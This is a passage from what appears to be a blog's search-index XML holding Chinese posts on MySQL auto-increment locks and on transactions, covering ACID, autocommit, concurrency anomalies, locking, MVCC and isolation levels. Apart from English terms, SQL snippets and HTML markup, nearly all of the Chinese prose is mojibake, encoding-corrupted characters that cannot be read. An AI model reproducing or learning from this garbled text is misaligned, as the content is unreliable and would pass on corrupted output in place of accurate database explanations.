é”å†å¯¹å¤§é‡æ•°æ®è¿›è¡Œæ’å…¥çš„æ—¶å€™ï¼Œä¼šå½±å“æ’å…¥æ€§èƒ½ï¼Œå› ä¸ºå¦ä¸€ä¸ªäº‹åŠ¡ä¸­çš„æ’å…¥ä¼šè¢«é˜»å¡ã€‚</p><p>å› æ­¤ï¼Œ åœ¨ MySQL 5.1.22 ç‰ˆæœ¬å¼€å§‹ï¼ŒInnoDB å­˜å‚¨å¼•æ“æä¾›äº†ä¸€ç§è½»é‡çº§çš„é”æ¥å®ç°è‡ªå¢ã€‚</p><p>ä¸€æ ·ä¹Ÿæ˜¯åœ¨æ’å…¥æ•°æ®çš„æ—¶å€™ï¼Œä¼šä¸ºè¢« AUTO_INCREMENT ä¿®é¥°çš„å­—æ®µåŠ ä¸Šè½»é‡çº§é”ï¼Œç„¶åç»™è¯¥å­—æ®µèµ‹å€¼ä¸€ä¸ªè‡ªå¢çš„å€¼ï¼Œå°±æŠŠè¿™ä¸ªè½»é‡çº§é”é‡Šæ”¾äº†ï¼Œè€Œä¸éœ€è¦ç­‰å¾…æ•´ä¸ªæ’å…¥è¯­å¥æ‰§è¡Œå®Œåæ‰é‡Šæ”¾é”ã€‚</p><p>InnoDB å­˜å‚¨å¼•æ“æä¾›äº†ä¸ª <code>innodb_autoinc_lock_mode</code> çš„ç³»ç»Ÿå˜é‡ï¼Œæ˜¯ç”¨æ¥æ§åˆ¶é€‰æ‹©ç”¨ AUTO-INC é”ï¼Œè¿˜æ˜¯è½»é‡çº§çš„é”ã€‚</p><div class="table-container"><table><thead><tr><th style="text-align:center">innodb_autoinc_lock_mode</th><th style="text-align:center">ä»‹ç»</th></tr></thead><tbody><tr><td style="text-align:center">0</td><td style="text-align:center">ä¼ ç»Ÿæ¨¡å¼</td></tr><tr><td style="text-align:center">1</td><td style="text-align:center">è¿ç»­æ¨¡å¼ï¼ˆMySQL 8.0 ä¹‹å‰é»˜è®¤ï¼‰</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">äº¤é”™æ¨¡å¼(MySQL 8.0 ä¹‹åé»˜è®¤)</td></tr></tbody></table></div><ul><li>å½“ <strong>innodb_autoinc_lock_mode = 0</strong>ï¼Œå°±é‡‡ç”¨ AUTO-INC é”ï¼Œè¯­å¥æ‰§è¡Œç»“æŸåæ‰é‡Šæ”¾é”ï¼›</li><li>å½“ <strong>innodb_autoinc_lock_mode = 2</strong>ï¼Œå°±é‡‡ç”¨è½»é‡çº§é”ï¼Œç”³è¯·è‡ªå¢ä¸»é”®åå°±é‡Šæ”¾é”ï¼Œå¹¶ä¸éœ€è¦ç­‰è¯­å¥æ‰§è¡Œåæ‰é‡Šæ”¾ã€‚</li><li>å½“ <strong>innodb_autoinc_lock_mode = 1</strong>ï¼š<ul><li>æ™®é€š insert è¯­å¥ï¼Œè‡ªå¢é”åœ¨ç”³è¯·ä¹‹åå°±é©¬ä¸Šé‡Šæ”¾ï¼›</li><li>ç±»ä¼¼ insert â€¦ select è¿™æ ·çš„æ‰¹é‡æ’å…¥æ•°æ®çš„è¯­å¥ï¼Œè‡ªå¢é”è¿˜æ˜¯è¦ç­‰è¯­å¥ç»“æŸåæ‰è¢«é‡Šæ”¾ï¼›</li></ul></li></ul><h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><ul><li>javaguide</li><li>å°æ—coding<br>â€¦</li></ul>]]></content>
      
      
      <categories>
          
          <category> æ•°æ®åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQLäº‹åŠ¡</title>
      <link href="/2023/12/21/MySQL%E4%BA%8B%E5%8A%A1/"/>
      <url>/2023/12/21/MySQL%E4%BA%8B%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h3 id="MySQLäº‹åŠ¡"><a href="#MySQLäº‹åŠ¡" class="headerlink" title="MySQLäº‹åŠ¡"></a>MySQLäº‹åŠ¡</h3><h4 id="ä»€ä¹ˆæ˜¯äº‹åŠ¡"><a href="#ä»€ä¹ˆæ˜¯äº‹åŠ¡" class="headerlink" title="ä»€ä¹ˆæ˜¯äº‹åŠ¡"></a>ä»€ä¹ˆæ˜¯äº‹åŠ¡</h4><p><strong>äº‹åŠ¡æ˜¯é€»è¾‘ä¸Šçš„ä¸€ç»„æ“ä½œï¼Œè¦ä¹ˆéƒ½æ‰§è¡Œï¼Œè¦ä¹ˆéƒ½ä¸æ‰§è¡Œ</strong>ã€‚</p><p>äº‹åŠ¡æœ€ç»å…¸ä¹Ÿç»å¸¸è¢«æ‹¿å‡ºæ¥è¯´ä¾‹å­å°±æ˜¯è½¬è´¦äº†ã€‚å‡å¦‚å°æ˜è¦ç»™å°çº¢è½¬è´¦ 1000 å…ƒï¼Œè¿™ä¸ªè½¬è´¦ä¼šæ¶‰åŠåˆ°ä¸¤ä¸ªå…³é”®æ“ä½œï¼Œè¿™ä¸¤ä¸ªæ“ä½œå¿…é¡»éƒ½æˆåŠŸæˆ–è€…éƒ½å¤±è´¥ã€‚</p><ol><li>å°†å°æ˜çš„ä½™é¢å‡å°‘ 1000 å…ƒ</li><li>å°†å°çº¢çš„ä½™é¢å¢åŠ  1000 å…ƒ</li></ol><p>äº‹åŠ¡ä¼šæŠŠè¿™ä¸¤ä¸ªæ“ä½œçœ‹æˆé€»è¾‘ä¸Šçš„ä¸€ä¸ªæ•´ä½“ï¼Œè¿™ä¸ªæ•´ä½“åŒ…å«çš„æ“ä½œè¦ä¹ˆéƒ½æˆåŠŸï¼Œè¦ä¹ˆéƒ½è¦å¤±è´¥ã€‚è¿™æ ·å°±ä¸ä¼šå‡ºç°å°æ˜ä½™é¢å‡å°‘è€Œå°çº¢çš„ä½™é¢å´å¹¶æ²¡æœ‰å¢åŠ çš„æƒ…å†µã€‚</p><h4 id="æ•°æ®åº“äº‹åŠ¡"><a href="#æ•°æ®åº“äº‹åŠ¡" class="headerlink" title="æ•°æ®åº“äº‹åŠ¡"></a>æ•°æ®åº“äº‹åŠ¡</h4><p>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åœ¨è°ˆè®ºäº‹åŠ¡çš„æ—¶å€™ï¼Œå¦‚æœæ²¡æœ‰ç‰¹æŒ‡åˆ†å¸ƒå¼äº‹åŠ¡ï¼Œå¾€å¾€æŒ‡çš„å°±æ˜¯æ•°æ®åº“äº‹åŠ¡ã€‚</p><p>æ•°æ®åº“äº‹åŠ¡åœ¨æˆ‘ä»¬æ—¥å¸¸å¼€å‘ä¸­æ¥è§¦çš„æœ€å¤šäº†ã€‚å¦‚æœä½ çš„é¡¹ç›®å±äºå•ä½“æ¶æ„çš„è¯ï¼Œä½ æ¥è§¦åˆ°çš„å¾€å¾€å°±æ˜¯æ•°æ®åº“äº‹åŠ¡äº†ã€‚é‚£æ•°æ®åº“äº‹åŠ¡æœ‰ä»€ä¹ˆä½œç”¨å‘¢ï¼Ÿ</p><p>ç®€å•æ¥è¯´ï¼Œæ•°æ®åº“äº‹åŠ¡å¯ä»¥ä¿è¯å¤šä¸ªå¯¹æ•°æ®åº“çš„æ“ä½œï¼ˆä¹Ÿå°±æ˜¯ SQL è¯­å¥ï¼‰æ„æˆä¸€ä¸ªé€»è¾‘ä¸Šçš„æ•´ä½“ã€‚æ„æˆè¿™ä¸ªé€»è¾‘ä¸Šçš„æ•´ä½“çš„è¿™äº›æ•°æ®åº“æ“ä½œéµå¾ªï¼š<strong>è¦ä¹ˆå…¨éƒ¨æ‰§è¡ŒæˆåŠŸ,è¦ä¹ˆå…¨éƒ¨ä¸æ‰§è¡Œ</strong> ã€‚</p><p><img src="https://pb01.s3.bitiful.net/140.png" alt="avatar"></p><h4 id="äº‹åŠ¡çš„-ACID-ç‰¹æ€§"><a href="#äº‹åŠ¡çš„-ACID-ç‰¹æ€§" class="headerlink" title="äº‹åŠ¡çš„ ACID ç‰¹æ€§"></a>äº‹åŠ¡çš„ ACID ç‰¹æ€§</h4><p>ACIDï¼Œæ˜¯æŒ‡å…³ç³»å‹æ•°æ®åº“äº‹åŠ¡æ­£ç¡®æ‰§è¡Œçš„å››ä¸ªåŸºæœ¬è¦ç´ çš„ç¼©å†™ã€‚åŒ…å«ï¼š</p><ul><li>åŸå­æ€§ï¼ˆAtomicityï¼‰</li><li>ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰</li><li>éš”ç¦»æ€§ï¼ˆIsolationï¼‰</li><li>æŒä¹…æ€§ï¼ˆDurabilityï¼‰</li></ul><h5 id="åŸå­æ€§ï¼ˆAtomicityï¼‰"><a href="#åŸå­æ€§ï¼ˆAtomicityï¼‰" class="headerlink" title="åŸå­æ€§ï¼ˆAtomicityï¼‰"></a>åŸå­æ€§ï¼ˆAtomicityï¼‰</h5><p><strong>åŸå­æ€§æ˜¯æŒ‡äº‹åŠ¡æ˜¯ä¸€ä¸ªä¸å¯åˆ†å‰²çš„å·¥ä½œå•ä½ï¼Œäº‹åŠ¡ä¸­çš„æ“ä½œè¦ä¹ˆéƒ½å‘ç”Ÿï¼Œè¦ä¹ˆéƒ½ä¸å‘ç”Ÿã€‚</strong></p><p>äº‹åŠ¡çš„åŸå­æ€§æ˜¯äº‹åŠ¡<strong>æœ€æ ¸å¿ƒ</strong>çš„ç‰¹æ€§ã€‚</p><h5 id="ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰"><a href="#ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰" class="headerlink" title="ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰"></a>ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰</h5><p><strong>ä¸€è‡´æ€§æ˜¯æŒ‡äº‹åŠ¡æ‰§è¡Œå‰åï¼Œæ•°æ®ä¿æŒä¸€è‡´ã€‚</strong></p><p>æ¯”å¦‚å°æ˜ç»™å°çº¢è½¬è´¦ï¼Œè½¬è´¦å‰åå°æ˜å’Œå°çº¢çš„ä½™é¢çš„å˜åŒ–å¤§å°æ˜¯ç›¸åŒçš„ã€‚</p><h5 id="éš”ç¦»æ€§ï¼ˆIsolationï¼‰"><a href="#éš”ç¦»æ€§ï¼ˆIsolationï¼‰" class="headerlink" title="éš”ç¦»æ€§ï¼ˆIsolationï¼‰"></a>éš”ç¦»æ€§ï¼ˆIsolationï¼‰</h5><p><strong>éš”ç¦»æ€§æ˜¯æŒ‡å¤šä¸ªç”¨æˆ·å¹¶å‘è®¿é—®æ•°æ®åº“æ—¶ï¼Œä¸€ä¸ªç”¨æˆ·çš„äº‹åŠ¡ä¸èƒ½è¢«å…¶ä»–ç”¨æˆ·çš„äº‹åŠ¡æ‰€å¹²æ‰°ï¼Œå¤šä¸ªå¹¶å‘äº‹åŠ¡ä¹‹é—´è¦ç›¸äº’éš”ç¦»ã€‚</strong></p><p>æ¯”å¦‚ï¼Œä¸€ä¸ªç”¨æˆ·æ­£åœ¨æ“ä½œæ•°æ®åº“ Aï¼Œå…¶ä»–ç”¨æˆ·ä¸èƒ½æ“ä½œæ•°æ®åº“ Aã€‚</p><h5 id="æŒä¹…æ€§ï¼ˆDurabilityï¼‰"><a href="#æŒä¹…æ€§ï¼ˆDurabilityï¼‰" class="headerlink" title="æŒä¹…æ€§ï¼ˆDurabilityï¼‰"></a>æŒä¹…æ€§ï¼ˆDurabilityï¼‰</h5><p><strong>æŒä¹…æ€§æ˜¯æŒ‡ä¸€ä¸ªäº‹åŠ¡ä¸€æ—¦è¢«æäº¤ï¼Œå®ƒå¯¹æ•°æ®åº“ä¸­æ•°æ®çš„æ”¹å˜å°±æ˜¯æ°¸ä¹…æ€§çš„ï¼Œæ¥ä¸‹æ¥å³ä½¿æ•°æ®åº“å‘ç”Ÿæ•…éšœä¹Ÿä¸åº”è¯¥å¯¹å…¶å½±å“ã€‚</strong></p><p>æ¯”å¦‚ï¼Œä¸€ä¸ªäº‹åŠ¡å¯¹æ•°æ®åº“ä¸­æ•°æ®çš„æ”¹å˜å·²ç»å†™å…¥ç£ç›˜ï¼Œå³ä½¿æ•°æ®åº“å‘ç”Ÿæ•…éšœï¼Œè¿™ä¸ªäº‹åŠ¡å¯¹æ•°æ®åº“ä¸­æ•°æ®çš„æ”¹å˜ä¹Ÿä¸åº”è¯¥ä¸¢å¤±ã€‚</p><p>ğŸŒˆ è¿™é‡Œè¦é¢å¤–è¡¥å……ä¸€ç‚¹ï¼šåªæœ‰ä¿è¯äº†äº‹åŠ¡çš„æŒä¹…æ€§ã€åŸå­æ€§ã€éš”ç¦»æ€§ä¹‹åï¼Œä¸€è‡´æ€§æ‰èƒ½å¾—åˆ°ä¿éšœã€‚ä¹Ÿå°±æ˜¯è¯´ <strong>Aã€Iã€D æ˜¯æ‰‹æ®µï¼ŒC æ˜¯ç›®çš„</strong>ï¼</p><h4 id="MySQLäº‹åŠ¡æ“ä½œ"><a href="#MySQLäº‹åŠ¡æ“ä½œ" class="headerlink" title="MySQLäº‹åŠ¡æ“ä½œ"></a>MySQLäº‹åŠ¡æ“ä½œ</h4><p>mysqlä¸­äº‹åŠ¡<strong>é»˜è®¤æ˜¯éšå¼äº‹åŠ¡</strong>ï¼Œæ‰§è¡Œinsertã€updateã€deleteæ“ä½œçš„æ—¶å€™ï¼Œæ•°æ®åº“è‡ªåŠ¨å¼€å¯äº‹åŠ¡ã€æäº¤æˆ–å›æ»šäº‹åŠ¡ã€‚</p><p>æ˜¯å¦å¼€å¯éšå¼äº‹åŠ¡æ˜¯ç”±å˜é‡autocommitæ§åˆ¶çš„ã€‚</p><h4 id="éšå¼äº‹åŠ¡"><a href="#éšå¼äº‹åŠ¡" class="headerlink" title="éšå¼äº‹åŠ¡"></a>éšå¼äº‹åŠ¡</h4><p>äº‹åŠ¡è‡ªåŠ¨å¼€å¯ã€æäº¤æˆ–å›æ»šï¼Œæ¯”å¦‚insertã€updateã€deleteè¯­å¥ï¼Œäº‹åŠ¡çš„å¼€å¯ã€æäº¤æˆ–å›æ»šç”±mysqlå†…éƒ¨è‡ªåŠ¨æ§åˆ¶çš„ã€‚</p><p>æŸ¥çœ‹å˜é‡autocommitæ˜¯å¦å¼€å¯äº†è‡ªåŠ¨æäº¤</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;autocommit&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+-------+</span></span><br><span class="line"><span class="operator">|</span> autocommit   <span class="operator">|</span> <span class="keyword">ON</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------+-------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span>, <span class="number">1</span> warning (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h4 id="æ˜¾å¼äº‹åŠ¡"><a href="#æ˜¾å¼äº‹åŠ¡" class="headerlink" title="æ˜¾å¼äº‹åŠ¡"></a>æ˜¾å¼äº‹åŠ¡</h4><p>æ˜¾å¼äº‹åŠ¡éœ€è¦æ‰‹åŠ¨å¼€å¯ã€æäº¤æˆ–å›æ»šï¼Œç”±å¼€å‘è€…è‡ªå·±æ§åˆ¶ã€‚</p><p><strong>æ–¹å¼1</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># è®¾ç½®ä¸è‡ªåŠ¨æäº¤äº‹åŠ¡</span><br><span class="line"><span class="keyword">set</span> autocommit<span class="operator">=</span><span class="number">0</span>;</span><br><span class="line"># æ‰§è¡Œäº‹åŠ¡æ“ä½œ</span><br><span class="line">SQL1,SQL2...</span><br><span class="line">## æäº¤æˆ–å›æ»š</span><br><span class="line"><span class="keyword">commit</span><span class="operator">|</span><span class="keyword">rollback</span>;</span><br></pre></td></tr></table></figure><p><strong>æ–¹å¼2</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># å¼€å¯ä¸€ä¸ªäº‹åŠ¡</span><br><span class="line"><span class="keyword">START</span> TRANSACTION;</span><br><span class="line"># æ‰§è¡Œäº‹åŠ¡æ“ä½œ</span><br><span class="line">SQL1,SQL2...</span><br><span class="line">## æäº¤æˆ–å›æ»š</span><br><span class="line"><span class="keyword">commit</span><span class="operator">|</span><span class="keyword">rollback</span>;</span><br></pre></td></tr></table></figure><h4 id="å¹¶å‘äº‹åŠ¡å¸¦æ¥äº†å“ªäº›é—®é¢˜"><a href="#å¹¶å‘äº‹åŠ¡å¸¦æ¥äº†å“ªäº›é—®é¢˜" class="headerlink" title="å¹¶å‘äº‹åŠ¡å¸¦æ¥äº†å“ªäº›é—®é¢˜?"></a>å¹¶å‘äº‹åŠ¡å¸¦æ¥äº†å“ªäº›é—®é¢˜?</h4><p>åœ¨å…¸å‹çš„åº”ç”¨ç¨‹åºä¸­ï¼Œå¤šä¸ªäº‹åŠ¡å¹¶å‘è¿è¡Œï¼Œç»å¸¸ä¼šæ“ä½œç›¸åŒçš„æ•°æ®æ¥å®Œæˆå„è‡ªçš„ä»»åŠ¡ï¼ˆå¤šä¸ªç”¨æˆ·å¯¹åŒä¸€æ•°æ®è¿›è¡Œæ“ä½œï¼‰ã€‚å¹¶å‘è™½ç„¶æ˜¯å¿…é¡»çš„ï¼Œä½†å¯èƒ½ä¼šå¯¼è‡´å¾ˆå¤šé—®é¢˜ã€‚</p><h5 id="è„è¯»ï¼ˆDirty-readï¼‰"><a href="#è„è¯»ï¼ˆDirty-readï¼‰" class="headerlink" title="è„è¯»ï¼ˆDirty readï¼‰"></a>è„è¯»ï¼ˆDirty readï¼‰</h5><p>ä¸€ä¸ªäº‹åŠ¡è¯»å–æ•°æ®å¹¶ä¸”å¯¹æ•°æ®è¿›è¡Œäº†ä¿®æ”¹ï¼Œè¿™ä¸ªä¿®æ”¹å¯¹å…¶ä»–äº‹åŠ¡æ¥è¯´æ˜¯å¯è§çš„ï¼Œå³ä½¿å½“å‰äº‹åŠ¡æ²¡æœ‰æäº¤ã€‚è¿™æ—¶å¦å¤–ä¸€ä¸ªäº‹åŠ¡è¯»å–äº†è¿™ä¸ªè¿˜æœªæäº¤çš„æ•°æ®ï¼Œä½†ç¬¬ä¸€ä¸ªäº‹åŠ¡çªç„¶å›æ»šï¼Œå¯¼è‡´æ•°æ®å¹¶æ²¡æœ‰è¢«æäº¤åˆ°æ•°æ®åº“ï¼Œé‚£ç¬¬äºŒä¸ªäº‹åŠ¡è¯»å–åˆ°çš„å°±æ˜¯è„æ•°æ®ï¼Œè¿™ä¹Ÿå°±æ˜¯è„è¯»çš„ç”±æ¥ã€‚</p><h5 id="ä¸¢å¤±ä¿®æ”¹ï¼ˆLost-to-modifyï¼‰"><a href="#ä¸¢å¤±ä¿®æ”¹ï¼ˆLost-to-modifyï¼‰" class="headerlink" title="ä¸¢å¤±ä¿®æ”¹ï¼ˆLost to modifyï¼‰"></a>ä¸¢å¤±ä¿®æ”¹ï¼ˆLost to modifyï¼‰</h5><p>åœ¨ä¸€ä¸ªäº‹åŠ¡è¯»å–ä¸€ä¸ªæ•°æ®æ—¶ï¼Œå¦å¤–ä¸€ä¸ªäº‹åŠ¡ä¹Ÿè®¿é—®äº†è¯¥æ•°æ®ï¼Œé‚£ä¹ˆåœ¨ç¬¬ä¸€ä¸ªäº‹åŠ¡ä¸­ä¿®æ”¹äº†è¿™ä¸ªæ•°æ®åï¼Œç¬¬äºŒä¸ªäº‹åŠ¡ä¹Ÿä¿®æ”¹äº†è¿™ä¸ªæ•°æ®ã€‚è¿™æ ·ç¬¬ä¸€ä¸ªäº‹åŠ¡å†…çš„ä¿®æ”¹ç»“æœå°±è¢«ä¸¢å¤±ï¼Œå› æ­¤ç§°ä¸ºä¸¢å¤±ä¿®æ”¹ã€‚</p><h5 id="ä¸å¯é‡å¤è¯»ï¼ˆUnrepeatable-readï¼‰"><a href="#ä¸å¯é‡å¤è¯»ï¼ˆUnrepeatable-readï¼‰" class="headerlink" title="ä¸å¯é‡å¤è¯»ï¼ˆUnrepeatable readï¼‰"></a>ä¸å¯é‡å¤è¯»ï¼ˆUnrepeatable readï¼‰</h5><p>æŒ‡åœ¨ä¸€ä¸ªäº‹åŠ¡å†…å¤šæ¬¡è¯»åŒä¸€æ•°æ®ã€‚åœ¨è¿™ä¸ªäº‹åŠ¡è¿˜æ²¡æœ‰ç»“æŸæ—¶ï¼Œå¦ä¸€ä¸ªäº‹åŠ¡ä¹Ÿè®¿é—®è¯¥æ•°æ®ã€‚é‚£ä¹ˆï¼Œåœ¨ç¬¬ä¸€ä¸ªäº‹åŠ¡ä¸­çš„ä¸¤æ¬¡è¯»æ•°æ®ä¹‹é—´ï¼Œç”±äºç¬¬äºŒä¸ªäº‹åŠ¡çš„ä¿®æ”¹å¯¼è‡´ç¬¬ä¸€ä¸ªäº‹åŠ¡ä¸¤æ¬¡è¯»å–çš„æ•°æ®å¯èƒ½ä¸å¤ªä¸€æ ·ã€‚è¿™å°±å‘ç”Ÿäº†åœ¨ä¸€ä¸ªäº‹åŠ¡å†…ä¸¤æ¬¡è¯»åˆ°çš„æ•°æ®æ˜¯ä¸ä¸€æ ·çš„æƒ…å†µï¼Œå› æ­¤ç§°ä¸ºä¸å¯é‡å¤è¯»ã€‚</p><h5 id="å¹»è¯»ï¼ˆPhantom-readï¼‰"><a href="#å¹»è¯»ï¼ˆPhantom-readï¼‰" class="headerlink" title="å¹»è¯»ï¼ˆPhantom readï¼‰"></a>å¹»è¯»ï¼ˆPhantom readï¼‰</h5><p>å¹»è¯»ä¸ä¸å¯é‡å¤è¯»ç±»ä¼¼ã€‚å®ƒå‘ç”Ÿåœ¨ä¸€ä¸ªäº‹åŠ¡ï¼ˆT1ï¼‰è¯»å–äº†å‡ è¡Œæ•°æ®ï¼Œæ¥ç€å¦ä¸€ä¸ªå¹¶å‘äº‹åŠ¡ï¼ˆT2ï¼‰æ’å…¥äº†ä¸€äº›æ•°æ®æ—¶ã€‚åœ¨éšåçš„æŸ¥è¯¢ä¸­ï¼Œç¬¬ä¸€ä¸ªäº‹åŠ¡ï¼ˆT1ï¼‰å°±ä¼šå‘ç°æœ‰å®ƒæœ¬æ¥æ²¡æœ‰çš„æ•°æ®ï¼Œå°±å¥½åƒå‘ç”Ÿäº†å¹»è§‰ä¸€æ ·ï¼Œæ‰€ä»¥ç§°ä¸ºå¹»è¯»ã€‚</p><p><strong>ä¸å¯é‡å¤è¯»å’Œå¹»è¯»æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</strong></p><p><code>ä¸å¯é‡å¤è¯»ä¾§é‡äºä¿®æ”¹ï¼Œå¹»è¯»ä¾§é‡äºæ–°å¢æˆ–åˆ é™¤ã€‚</code></p><h4 id="å¹¶å‘äº‹åŠ¡çš„æ§åˆ¶æ–¹å¼æœ‰å“ªäº›ï¼Ÿ"><a href="#å¹¶å‘äº‹åŠ¡çš„æ§åˆ¶æ–¹å¼æœ‰å“ªäº›ï¼Ÿ" class="headerlink" title="å¹¶å‘äº‹åŠ¡çš„æ§åˆ¶æ–¹å¼æœ‰å“ªäº›ï¼Ÿ"></a>å¹¶å‘äº‹åŠ¡çš„æ§åˆ¶æ–¹å¼æœ‰å“ªäº›ï¼Ÿ</h4><p>MySQL ä¸­å¹¶å‘äº‹åŠ¡çš„æ§åˆ¶æ–¹å¼æ— éå°±ä¸¤ç§ï¼š<strong>é” å’Œ MVCC</strong>ã€‚é”å¯ä»¥çœ‹ä½œæ˜¯æ‚²è§‚æ§åˆ¶çš„æ¨¡å¼ï¼Œå¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ï¼ˆMVCCï¼‰å¯ä»¥çœ‹ä½œæ˜¯ä¹è§‚æ§åˆ¶çš„æ¨¡å¼ã€‚</p><p>é”æ§åˆ¶æ–¹å¼ä¸‹ä¼šé€šè¿‡é”æ¥æ˜¾ç¤ºæ§åˆ¶å…±äº«èµ„æºè€Œä¸æ˜¯é€šè¿‡è°ƒåº¦æ‰‹æ®µï¼ŒMySQLä¸­ä¸»è¦æ˜¯é€šè¿‡<strong>è¯»å†™é”</strong>æ¥å®ç°å¹¶å‘æ§åˆ¶ã€‚</p><ul><li><strong>å…±äº«é”ï¼ˆS é”ï¼‰</strong>ï¼šåˆç§°è¯»é”ï¼Œäº‹åŠ¡åœ¨è¯»å–è®°å½•çš„æ—¶å€™è·å–å…±äº«é”ï¼Œå…è®¸å¤šä¸ªäº‹åŠ¡åŒæ—¶è·å–ï¼ˆé”å…¼å®¹ï¼‰ã€‚</li><li><strong>æ’ä»–é”ï¼ˆX é”ï¼‰</strong>ï¼šåˆç§°å†™é”/ç‹¬å é”ï¼Œäº‹åŠ¡åœ¨ä¿®æ”¹è®°å½•çš„æ—¶å€™è·å–æ’ä»–é”ï¼Œä¸å…è®¸å¤šä¸ªäº‹åŠ¡åŒæ—¶è·å–ã€‚å¦‚æœä¸€ä¸ªè®°å½•å·²ç»è¢«åŠ äº†æ’ä»–é”ï¼Œé‚£å…¶ä»–äº‹åŠ¡ä¸èƒ½å†å¯¹è¿™æ¡è®°å½•åŠ ä»»ä½•ç±»å‹çš„é”ï¼ˆé”ä¸å…¼å®¹ï¼‰ã€‚</li></ul><p>è¯»å†™é”å¯ä»¥åšåˆ°è¯»è¯»å¹¶è¡Œï¼Œä½†æ˜¯æ— æ³•åšåˆ°å†™è¯»ã€å†™å†™å¹¶è¡Œã€‚å¦å¤–ï¼Œæ ¹æ®æ ¹æ®é”ç²’åº¦çš„ä¸åŒï¼Œåˆè¢«åˆ†ä¸ºè¡¨çº§é” å’Œ è¡Œçº§é”ã€‚InnoDB(MySQL5.5ç‰ˆæœ¬åçš„é»˜è®¤å­˜å‚¨å¼•æ“) ä¸å…‰æ”¯æŒè¡¨çº§é”ï¼Œè¿˜æ”¯æŒè¡Œçº§é”ï¼Œé»˜è®¤ä¸ºè¡Œçº§é”ã€‚</p><p>è¡Œçº§é”çš„ç²’åº¦æ›´å°ï¼Œä»…å¯¹ç›¸å…³çš„è®°å½•ä¸Šé”å³å¯ï¼ˆå¯¹ä¸€è¡Œæˆ–è€…å¤šè¡Œè®°å½•åŠ é”ï¼‰ï¼Œæ‰€ä»¥å¯¹äºå¹¶å‘å†™å…¥æ“ä½œæ¥è¯´ï¼Œ InnoDB çš„æ€§èƒ½æ›´é«˜ã€‚ä¸è®ºæ˜¯è¡¨çº§é”è¿˜æ˜¯è¡Œçº§é”ï¼Œéƒ½å­˜åœ¨å…±äº«é”å’Œæ’ä»–é”ã€‚</p><p>MVCC æ˜¯å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶æ–¹æ³•ï¼Œå³å¯¹ä¸€ä»½æ•°æ®ä¼šå­˜å‚¨å¤šä¸ªç‰ˆæœ¬ï¼Œé€šè¿‡äº‹åŠ¡çš„å¯è§æ€§æ¥ä¿è¯äº‹åŠ¡èƒ½çœ‹åˆ°è‡ªå·±åº”è¯¥çœ‹åˆ°çš„ç‰ˆæœ¬ã€‚é€šå¸¸ä¼šæœ‰ä¸€ä¸ªå…¨å±€çš„ç‰ˆæœ¬åˆ†é…å™¨æ¥ä¸ºæ¯ä¸€è¡Œæ•°æ®è®¾ç½®ç‰ˆæœ¬å·ï¼Œç‰ˆæœ¬å·æ˜¯å”¯ä¸€çš„ã€‚</p><p>MVCC åœ¨ MySQL ä¸­å®ç°æ‰€ä¾èµ–çš„æ‰‹æ®µä¸»è¦æ˜¯: <strong>éšè—å­—æ®µã€read viewã€undo log</strong>ã€‚</p><ul><li>undo log : undo log ç”¨äºè®°å½•æŸè¡Œæ•°æ®çš„å¤šä¸ªç‰ˆæœ¬çš„æ•°æ®ã€‚</li><li>read view å’Œ éšè—å­—æ®µ : ç”¨æ¥åˆ¤æ–­å½“å‰ç‰ˆæœ¬æ•°æ®çš„å¯è§æ€§ã€‚</li></ul><h4 id="éš”ç¦»çº§åˆ«"><a href="#éš”ç¦»çº§åˆ«" class="headerlink" title="éš”ç¦»çº§åˆ«"></a>éš”ç¦»çº§åˆ«</h4><p>SQL æ ‡å‡†å®šä¹‰äº†å››ä¸ªéš”ç¦»çº§åˆ«ï¼š</p><ul><li>READ-UNCOMMITTED(è¯»å–æœªæäº¤) ï¼šæœ€ä½çš„éš”ç¦»çº§åˆ«ï¼Œå…è®¸è¯»å–å°šæœªæäº¤çš„æ•°æ®å˜æ›´ï¼Œå¯èƒ½ä¼šå¯¼è‡´è„è¯»ã€å¹»è¯»æˆ–ä¸å¯é‡å¤è¯»ã€‚</li><li>READ-COMMITTED(è¯»å–å·²æäº¤) ï¼šå…è®¸è¯»å–å¹¶å‘äº‹åŠ¡å·²ç»æäº¤çš„æ•°æ®ï¼Œå¯ä»¥é˜»æ­¢è„è¯»ï¼Œä½†æ˜¯å¹»è¯»æˆ–ä¸å¯é‡å¤è¯»ä»æœ‰å¯èƒ½å‘ç”Ÿã€‚</li><li>REPEATABLE-READ(å¯é‡å¤è¯») 